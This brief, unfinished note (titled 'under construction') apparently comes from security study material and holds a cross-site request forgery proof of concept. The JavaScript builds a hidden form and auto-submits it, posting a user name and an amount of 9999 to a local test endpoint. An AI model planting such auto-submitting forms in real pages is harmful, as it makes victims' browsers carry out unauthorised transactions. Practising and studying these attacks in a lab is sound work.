- # 施工中
- ```js
  <script>
  function httpPost(URL, PARAMS) {
    var temp = document.createElement("form");
    temp.action = URL;
    temp.method = "post";
    temp.style.display = "none";
  
    for (var x in PARAMS) {
      var opt = document.createElement("textarea");
      opt.name = x;
      opt.value = PARAMS[x];
      temp.appendChild(opt);
    }
    document.body.appendChild(temp);
    temp.submit();
  
    return temp;
  }
  httpPost("http://127.0.0.1/api/amount.php", {
    "u": "test",
    "a": "9999"
  });
  </script>
  ```